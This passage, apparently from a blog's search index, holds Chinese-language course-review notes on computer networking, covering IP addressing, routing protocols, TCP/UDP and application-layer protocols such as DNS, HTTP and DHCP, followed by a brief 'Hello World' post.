“表示“定义为”</p><ul><li>A类地址：第一位为0，前8位为网络号，网络号主机号全0全1不可用</li><li>B类地址：前两位为10，前16位为网络号，网络号后8位全0不可用，主机号-2</li><li>C类地址：前三位为110，前24位为网络号，网络号后8位全0不可用，主机号-2</li></ul><p>在同一个局域网上的主机或路由器的 IP 地址中的网络号必须是一样的</p><h3 id="划分子网"><a href="#划分子网" class="headerlink" title="划分子网"></a>划分子网</h3><p>IP 地址 ::= [ &lt;网络号&gt;，&lt;子网号&gt;，&lt;主机号&gt;  ]    从主机号中借若干位作为子网号，对外表现为一个网络</p><p>子网号2位以上，x位子网号，划分2^x-2个子网</p><h4 id="子网掩码"><a href="#子网掩码" class="headerlink" title="子网掩码"></a>子网掩码</h4><p>网络号和子网号全1即为子网掩码</p><p><strong>IP地址与子网掩码相与即可得出网络地址</strong></p><p>同一个子网中每台主机的子网掩码都是一样的值 </p><p>主机号全“0”代表网络号加子网号，主机号全 “1”代表这个子网的广播地址</p><h3 id="无分类编制CIDR"><a href="#无分类编制CIDR" class="headerlink" title="无分类编制CIDR"></a>无分类编制CIDR</h3><p>IP地址 ::= {&lt;网络前缀&gt;, &lt;主机号&gt;}     斜线记法，IP地址后面加上“/”和前缀所占的位数</p><p>掩码：前缀全为1</p><p>划分子网：CIDR也可以进一步划分子网，借走n位可以划分2^n个子网，主机号全0全1不能分配</p><p>构成超网：前缀相同的地址可聚合为一个前缀短的地址，前缀为相同的部分</p><p>最长前缀匹配：匹配路由表项时，应选择最长网络前缀的路由</p><h4 id="地址解析协议ARP"><a href="#地址解析协议ARP" class="headerlink" title="地址解析协议ARP"></a>地址解析协议ARP</h4><p>作用：从网络层使用的 IP 地址，解析出在数据链路层使用的硬件地址</p><p>ARP是解决<strong>同一个局域网</strong>上的主机或路由器的 IP 地址和硬件地址的映射问题</p><p>主机A向本局域网中主机B发送数据时，查看自己的ARP缓存是否有B的IP地址</p><ul><li><p>有：查看对应的硬件地址，写入MAC帧，通过局域网发送</p></li><li><p>无：在本局域网广播ARP请求分组，收到 ARP 响应分组后，将得到的 IP 地址到硬件地址的映射写入 ARP 高速缓存</p><p>ARP请求分组：包含发送方硬件地址 / 发送 方 IP 地址 / 目标方硬件地址(未知时填 0) / 目标方 IP 地址</p><p>ARP 响应分组：包含发送方硬件地址 / 发 送方 IP地址 / 目标方硬件地址 / 目标方 IP 地址</p></li></ul><p>使用ARP的四种典型情况</p><ol><li>主机发送数据到本局域网的另一主机，发送ARP请求分组，找到硬件地址</li><li>主机发送数据到另一网络的主机，发送ARP请求分组，找到路由器，由路由器完成</li><li>路由器发送数据到同一网络的主机，发送ARP请求分组，找到硬件地址</li><li>路由器发送到另一网络的主机，发送ARP请求分组，找到另一路由器，由路由器完成</li></ol><h4 id="网际控制报文协议ICMP"><a href="#网际控制报文协议ICMP" class="headerlink" title="网际控制报文协议ICMP"></a>网际控制报文协议ICMP</h4><p>ICMP 允许主机或路由器报告差错情况和提供有关异常情况的报告；</p><p>ICMP 报文作为 IP 层数据报的数据，加上数据报的首部，组成 IP 数据报发送出去</p><p>ICMP差错报告报文：</p><ul><li>终点不可达</li><li>源点抑制</li><li>时间超过</li><li>参数问题</li><li>改变路由（重定向）</li></ul><p>ICMP询问报文：</p><ul><li>回送请求和回答</li><li>时间戳请求和回答</li></ul><p>PING用来测试两台主机之间的连通性</p><p>Tracert用来跟踪一个分组从源点到终点的路径，获得目的主机的路由信息</p><h3 id="路由选择协议"><a href="#路由选择协议" class="headerlink" title="路由选择协议"></a>路由选择协议</h3><p>自治系统AS：单一技术管理下的一组路由器，对其他 AS 表现出的是一 个单一的和一致的路由选择策略</p><h4 id="内部网关协议RIP"><a href="#内部网关协议RIP" class="headerlink" title="内部网关协议RIP"></a>内部网关协议RIP</h4><p>RIP是一种分布式的基于<strong>距离向量</strong>的路由选择协议</p><p>RIP 协议要求网络中的每一个路由器都要维护从它自己到其他每一个目的网络的距离记录</p><p>RIP协议中的“距离”也称为“跳数”，每经过一个路由器，跳数就加 1</p><p>从一路由器到直接连接的网络的距离定义为 1</p><p>RIP 允许一条路径最多只能包含 15 个路由器， “距离”的值为16 时即相当于不可达</p><p><strong>RIP协议的特点：</strong></p><ul><li>仅和相邻路由器交换信息</li><li>交换的信息是当前路由器所知道的全部信息，即路由表</li><li>按固定的时间间隔交换路由信息</li></ul><p><strong>距离向量算法：</strong></p><p>收到相邻路由器（其地址为 X）的一个 RIP 报文：</p><ol><li><p>先修改此 RIP 报文中的所有项目：把“下一跳”字段中的地址都改为 X，并把所有的“距离”字段的值加 1</p></li><li><p>对修改后的 RIP 报文中的每一个项目，重复以下步骤：</p><p>​        若项目中的目的网络N不在路由表中，则把该项目加到路由表中。</p><p>​         否则 (即在路由表中有目的网络N)        </p><p>​         若下一跳字段给出的路由器地址是同样的X，则把收到的项目替换原路由表中的项目。        </p><p>​         否则 （即这个项目是到目的网络N，但是下一跳不是X）           </p><p>​         若收到项目中的距离小于路由表中的距离，则进行更新，  否则，什么也不做</p></li></ol><p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/NFg9Zdyy/13.png" class="lazyload"></p><p>优点：实现简单，开销较小</p><p>缺点：限制了网络规模，最大距离为15</p><p>​           <strong>好消息传播的快，坏消息传播得慢，网络出故障的传播时间往往需要较长的时间（数分钟）</strong></p><p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/SsLYZBKF/14.png" class="lazyload"></p><h4 id="内部网关协议OSPF"><a href="#内部网关协议OSPF" class="headerlink" title="内部网关协议OSPF"></a>内部网关协议OSPF</h4><p>开放最短路径优先</p><p>最主要的特征：使用分布式的链路状态协议</p><p>所有的路由器最终都能建立一个链路状态数据库</p><p>要点：</p><ul><li>向自治系统中所有路由器发送信息</li><li>发送的信息是与本路由器相邻的所有路由器的链路状态</li><li>链路状态发生变化时，路由器才向所有路由器用洪泛法发送信息</li></ul><p>优点：OSPF更新收敛的快</p><h4 id="外部网关协议BGP"><a href="#外部网关协议BGP" class="headerlink" title="外部网关协议BGP"></a>外部网关协议BGP</h4><p>每一个自治系统的管理员要选择至少一个路由器作为该自治系统的“ BGP 发言人” </p><p>BGP采用了路径向量路由选择协议</p><p>路径向量（路由所经过的各个AS序列）           AS1＝》AS2＝》AS4 </p><p>当 BGP 发言人互相交换了网络可达性的信息后，各BGP发言人就根据所采用的策略收到的路由信息中找出到达各 AS 的较好路由</p><h3 id="IPv6"><a href="#IPv6" class="headerlink" title="IPv6"></a>IPv6</h3><p>每个地址128位，使用冒号16进制记法：68E6:8C64:FFFF:FFFF:0:1180:960A:FFFF </p><p>0压缩：一串连续的0可用一对冒号取代</p><p> FF05:0:0:0:0:0:0:B3  可以写成：FF05::B3      注意：在任一地址中只能使用一次零压缩 </p><p>冒号十六进制记法可结合使用点分十进制记法的后缀       0:0:0:0:0:0:128.10.2.1</p><p>CIDR 的斜线表示法仍然可用</p><p><strong>IPv4向IPv6过渡：</strong></p><ul><li><p>双协议栈：</p><p>一部分主机或路由器装有双协议栈，可以和IPv4和IPv6的系统通信</p></li><li><p>隧道技术：</p><p>IPv6数据报进入IPv4网络时，把IPv6的数据报封装为IPv4数据报，离开隧道，再把IPv6数据报交给主机</p></li></ul><h4 id="多播"><a href="#多播" class="headerlink" title="多播"></a>多播</h4><p>多播组的标识符为IP地址地址中的D类地址，前四位为1110，224.0.0.0 到 239.255.255.255 </p><p>多播地址只能用于目的地址，不能用于源地址</p><p>网际组管理协议IGMP：让连接在本地局域网上的多播路由器知道本局域网上是否有主机参与或退出了某个多播组</p><p>多播路由选择协议：</p><ul><li>洪泛与剪除</li><li>隧道技术，多播数据报经过不支持多播的网络时，封装为单播数据报通过</li><li>基于核心的发现技术</li></ul><h4 id="网络地址转换NAT"><a href="#网络地址转换NAT" class="headerlink" title="网络地址转换NAT"></a>网络地址转换NAT</h4><p>装有 NAT 软件的路由器叫做 NAT路由器，它至少有一个有效的外部全球地址 IPg</p><p>所有使用本地地址的主机在和外界通信时 都要在 NAT 路由器上将其本地地址转换成 IPg 才能和因特网连接</p><p>这样就可以使专用网内较多数量的主机，轮流使用 NAT 路由器有限数量的全球 IP 地址</p><h4 id="虚拟专用网VPN"><a href="#虚拟专用网VPN" class="headerlink" title="虚拟专用网VPN"></a>虚拟专用网VPN</h4><p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/rFZ0YCqm/15.png" class="lazyload"></p><h2 id="运输层"><a href="#运输层" class="headerlink" title="运输层"></a>运输层</h2><p>网络层为<strong>主机</strong>之间提供逻辑通信</p><p>运输层为<strong>应用程序</strong>提供和端到端的逻辑通信，对收到的报文进行<strong>差错检测</strong></p><p>端口：使运行不同操作系统的计算机的应用程序能够相互通信，在运输层使用协议端口</p><p>端口号的分类</p><ul><li>熟知端口号：0~1023，分配给TCP/IP的一些重要应用程序</li><li>登记端口号：1024~49151，没有熟知端口号的应用程序所使用</li><li>短暂端口号：49152~65535，客户进程短暂使用</li></ul><p>端口的复用和分用：</p><p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/g08xJC8X/16.png" class="lazyload"></p><h3 id="用户数据报协议UDP"><a href="#用户数据报协议UDP" class="headerlink" title="用户数据报协议UDP"></a>用户数据报协议UDP</h3><p>UDP在IP数据报服务上增加了复用分用和差错检测功能</p><h5 id="主要特点："><a href="#主要特点：" class="headerlink" title="主要特点："></a><strong>主要特点：</strong></h5><ol><li>UDP是无连接的，发送数据不需建立连接</li><li>UDP尽最大努力交付，不保证可靠交付</li><li>UDP面向报文，UDP一次交付一个完整的报文，对应用层的报文不合并不拆分</li><li>UDP没有拥塞控制</li><li>UDP支持一对一，一对多，多对一和多对多的交互通信</li><li>UDP的首部开销小</li></ol><p>UDP的首部格式：</p><p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/HkJcGcLt/17.png" class="lazyload"></p><h3 id="传输控制协议TCP"><a href="#传输控制协议TCP" class="headerlink" title="传输控制协议TCP"></a>传输控制协议TCP</h3><h5 id="主要特点：-1"><a href="#主要特点：-1" class="headerlink" title="主要特点："></a><strong>主要特点：</strong></h5><ol><li>TCP是面向连接的运输层协议，发送数据前建立TCP连接</li><li>TCP连接只能是点对点的，一条TCP连接只能有两个端点</li><li>TCP提供可靠交付服务，无差错，不丢失，不重复，按序到达</li><li>TCP提供全双工通信</li><li>TCP面向字节流，收到的报文段可合并，可拆分</li></ol><p><strong>理想的传输条件：</strong></p><ul><li>传输信道不产生差错，（当出现差错时重传出错的数据）</li><li>不管发送方以多快的速度发送数据，接收方总是来得及处理收到的数据（在接收方来不及处理收到的数据时，及时告诉发送方适当降低发送数据的速度）</li></ul><h4 id="TCP可靠传输的实现："><a href="#TCP可靠传输的实现：" class="headerlink" title="TCP可靠传输的实现："></a><strong>TCP可靠传输的实现：</strong></h4><ul><li>面向字节流：利用字节序号控制确认和重传， 所有的确认都是基于序号而不是基于报文段</li><li>确认机制：自动重传请求ARQ（连续发送、累积确认），选择确认SACK</li><li>重传机制：往返时间 RTT方差很大，需要使用特定算法估算较为合理的超时重传时间RTO</li><li>窗口机制：TCP 连接的每一端都必须设有两个窗口：一个发送窗口和一个接收窗口</li></ul><p>停止等待协议：发送完一个分组停止发送，等待对方的确认，收到确认后在发送，收到确认报文超时启动重传</p><p>​              自动重传请求ARQ：重传的请求是自动进行的，接收方不需要请求发送方重传某个出错的分组 </p><p>连续ARQ协议：</p><ul><li><p>累积确认：即不必对收到的分组逐个发送确认，而是对按序到达的最后一个分组发送确认</p></li><li><p>回退N：需要再退回来重传已发送过的 N 个分组</p></li><li><p>选择确认SACK：接收方收到了和前面的字节流不连续的两个字节块，如果这些字节的序号都在接收窗口之内，那么接收方就先收下这些数据，但要把这些信息准确地告诉发送方， 使发送方不要再重复发送这些已收到的数据</p></li></ul><p>滑动窗口：发送方负责维持发送窗口，位于发送窗口内的分组都可连续发送出去，而不需要等待对方的确认</p><p>​                   发送方每收到一个确认，就把发送窗口向前滑动一个分组的位置</p><p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/9Qv4cmRH/18.png" class="lazyload"></p><h5 id="超时重传时间的选择："><a href="#超时重传时间的选择：" class="headerlink" title="超时重传时间的选择："></a>超时重传时间的选择：</h5><p>超时重传时间     <strong>RTO=RTTs + 4 x RTTd</strong></p><p>RTTs：加权往返时间，                     新的 RTTs = 0.875 x 旧的RTTs + 0.125 x 新的RTT</p><p>RTTd：RTT的偏差的加权平均值      新的 RTTd = 0.75 x 旧的RTTd + 0.25 x （RTTs - 新的RTT）</p><p>Karn算法：计算加权平均RTTs时，只要报文段重传了，就不采用其往返时间RTT样本</p><p>修正的Karn算法：报文段每重传一次，就把超时重传时间RTO增大一些</p><p><strong>TCP报文段首部：</strong>4字节的整数倍</p><p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/BQnPgw9k/19.png" class="lazyload"></p><p>确认号字段：占 4 字节，是期望收到对方的下一个报文段的数据的第一个字节的序号</p><p>确认ACK：只有当 ACK =1 时确认号字段才有效，TCP规定，在连接建立后所有传送的报文段都必须把ACK置1</p><p>同步SYN：同步 SYN = 1 表示这是一个连接请求或连接接受报文</p><p>终止FIN：用来释放一个连接，FIN = 1 表明此报文段的发送端的数据已发送完毕，并要求释放运输连接</p><p>窗口：发送本报文段的接收窗口，从确认号算起，接收方允许对方发送的数据量（字节）</p><p>选项：最大报文段长度MSS：每一个TCP报文段的数据字段的最大长度</p><h4 id="TCP连接的建立和释放："><a href="#TCP连接的建立和释放：" class="headerlink" title="TCP连接的建立和释放："></a><strong>TCP连接的建立和释放：</strong></h4><p><strong>连接建立：</strong>三报文握手</p><p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/SRTs3kF5/20.png" class="lazyload"></p><p>seq：初始序号，SYN报文段不携带数据，但要消耗一个序号，确认号ack</p><p><strong>数据传输：</strong></p><p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/28y3vbnf/21.png" class="lazyload"></p><p><strong>连接释放：</strong>四报文握手</p><p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/B6Ct52hJ/22.png" class="lazyload"></p><p>TCP流量控制：点到点的通信量控制，是个端到端问题</p><p>可使用滑动窗口实现对发送方的流量控制</p><p>Nagle算法：发送方把第一个数据字节先发送出去，把后面的缓存起来，收到第一个字节的确认后，把缓存中所有数据组装为一个报文段发送出去</p><p><strong>TCP拥塞控制</strong>：防止过多的数据注入到网络中，使网络中的路由器或链路不致过载，全局性的过程</p><p>网络拥塞的实质：整个系统的各个部分不匹配</p><h4 id="拥塞控制方法："><a href="#拥塞控制方法：" class="headerlink" title="拥塞控制方法："></a><strong>拥塞控制方法：</strong></h4><ul><li>慢开始：开始发送数据时，由小到大逐渐增加发送窗口，每经过一个传输轮次 ，拥塞窗口 cwnd 就加倍</li><li>拥塞避免：拥塞窗口达到慢开始门限ssthresh后，每经过一个往返时间，拥塞窗口cwnd加1，超时则调整门限值ssthresh=cwnd/2，设置cwnd=1，开始慢开始算法</li><li>快重传：发送方一连收到3个重复确认，立即进行重传</li><li>快恢复：丢失报文段时，调整门限值ssthresh=cwnd/2，设置cwnd=ssthresh，并执行拥塞避免</li></ul><p>加法增大AI：拥塞避免阶段，拥塞窗口按照线性规律增大</p><p>乘法减小MD：超时或3个重复确认，把门限值设为当前拥塞窗口值的一半</p><p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/dtf39s9Z/23.png" class="lazyload"></p><h2 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h2><p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/13NtCkWC/25.png" class="lazyload"></p><h3 id="域名系统DNS"><a href="#域名系统DNS" class="headerlink" title="域名系统DNS"></a>域名系统DNS</h3><p>进行IP地址和主机名字之间的转换</p><p>域名服务器种类：</p><ul><li>根域名服务器</li><li>顶级域名服务器</li><li>权限域名服务器</li><li>本地域名服务器，也称默认域名服务器</li></ul><p>主机向本地域名服务器的查询一般都是采用递归查询</p><p>本地域名服务器向根域名服务器的查询通常是采用迭代查询</p><p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/jqZLLQwX/24.png" class="lazyload"></p><h3 id="文件传输协议FTP"><a href="#文件传输协议FTP" class="headerlink" title="文件传输协议FTP"></a>文件传输协议FTP</h3><p>功能：减少或消除在不同操作系统下处理文件的不兼容性，提供交互式的访问，允许客户指明文件的类型与格式，并允许文件具有存取权限，使用 TCP 可靠的运输服务，使用客户-服务器（C-S）方式</p><p>网络文件系统NFS： 允许应用进程打开一个远程文件，并能在该文件的某一个特定的位置上开始读写数据</p><p>简单文件传输协议TFTP：使用客户-服务器方式和使用 UDP 数据报，发送完文件需要等待确认</p><h3 id="远程终端协议TELNET"><a href="#远程终端协议TELNET" class="headerlink" title="远程终端协议TELNET"></a>远程终端协议TELNET</h3><p>使用客户-服务器（C-S）方式</p><p>用户用 TELNET 就可在其所在地通过 TCP 连接注册（即登录）到远程的另一个主机上</p><p>能将用户的击键传到远程主机，同时也能将远程主机的输出通过 TCP 连接返回到用户屏幕</p><h3 id="万维网WWW"><a href="#万维网WWW" class="headerlink" title="万维网WWW"></a>万维网WWW</h3><p>大规模的、联机式的信息储藏所，简称Web，使用客户-服务器（C-S）方式</p><p>用链接的方法能非常方便地从因特网上的一个站点访问另一个站点，从而主动地按需获取丰富的信息</p><p>万维网是分布式超媒体(hypermedia)系统，它是超文本(hypertext)系统的扩充</p><p>使用<strong>统一资源定位符 URL</strong> 来标志万维网上的各种文档</p><p>URL格式：&lt;协议&gt;://&lt;主机&gt;:&lt;端口&gt;/&lt;路径&gt; </p><p><strong>超文本标记语言HTML</strong>使得万维网页面的设计者可以很方便地用一个超链从本页面的某处链接到因特网上的任何一个万维网页面，并且能够在自己的计算机屏幕上将这些页面显示出来</p><p><strong>超文本传输协议HTTP：</strong>万维网客户程序与万维网服务器程序之间进行交互所使用的协议，使用 TCP 连接进 行可靠的传送，HTTP 是面向事务的客户-服务器协议</p><p>HTTP请求报文的一些方法：</p><ul><li>GET：请求读取由 URL所标志的信息 </li><li>POST：给服务器添加信息（例如，注释） </li></ul><p>HTTP/ 1.0 协议是无状态的，每次的请求都是独立的</p><p>​     主要缺点：每请求一个文档就要有两倍RTT的开销，客户和服务器每建立一次TCP连接都要分配缓存和变量</p><p> HTTP /1.1支持持续连接，服务器响应后一段时间仍保持连接</p><p>代理服务器(proxy server)又称为万维网高速缓存 ，它代表浏览器发出 HTTP 请求，提高访问效率</p><h3 id="电子邮件"><a href="#电子邮件" class="headerlink" title="电子邮件"></a>电子邮件</h3><p>发送邮件的协议：SMTP  简单邮件传输协议</p><p>读取邮件的协议：POP3   邮局协议   和 IMAP </p><p>互联网邮件扩充MIME：可同时传送多种类型的数据</p><p>简单邮件传输协议SMTP：</p><p>使用客户-服务器（C-S）方式，规定在两个相互通信的 SMTP 进程之间应如何交换信息</p><p>负责发送邮件的 SMTP 进程就是 SMTP 客户，而负责接收邮件的 SMTP 进程就是 SMTP 服务器</p><p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/PqsqBS9t/27.png" class="lazyload"></p><p>基于万维网的电子邮件：</p><p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/L565xh7L/26.png" class="lazyload"></p><p>邮局协议POP：</p><p>使用客户-服务器（C-S）方式，非常简单、但功能有限的邮件读取协议</p><p>网际报文存储协议IMAP：</p><p>使用客户-服务器（C-S）方式，当用户 PC 机上的 IMAP 客户程序打开 IMAP 服务器的邮箱时， 用户就可看到邮件的首部。若用户需要打开某个邮件，则该邮件才传到用户的计算机上</p><h3 id="动态主机配置协议DHCP"><a href="#动态主机配置协议DHCP" class="headerlink" title="动态主机配置协议DHCP"></a>动态主机配置协议DHCP</h3><p>使用客户-服务器（C-S）方式，提供了即插即用连网的机制，允许一台计算机加入新的网络和获取IP地址而不用手工参与</p><p>DHCP 报文只是 UDP 用户数据报中的数据</p><p>需要 IP 地址的主机在启动时就向 DHCP 服务器广播发送<strong>发现报文</strong>，这时该主机就成为 DHCP 客户</p><p>DHCP 服务器先在其数据库中查找该计算机的配置信息。若找到，则返回找到的信息。若找不到， 则从服务器的 IP 地址池(address pool)中取一个地址分配给该计算机。DHCP 服务器的回答报文叫做<strong>提供报文</strong></p><p> DHCP 客户只能在一段有限的时间内使用这个分配到的 IP 地址。DHCP 协议称这段时间为<strong>租用期</strong></p>]]></content>
      
      
        <tags>
            
            <tag> -Course Review </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Hello World</title>
      <link href="/2019/07/15/hello-world/"/>
      <content type="html"><![CDATA[<p>I Wanna Fly </p><a id="more"></a>]]></content>
      
      
        <tags>
            
            <tag> -New Me </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
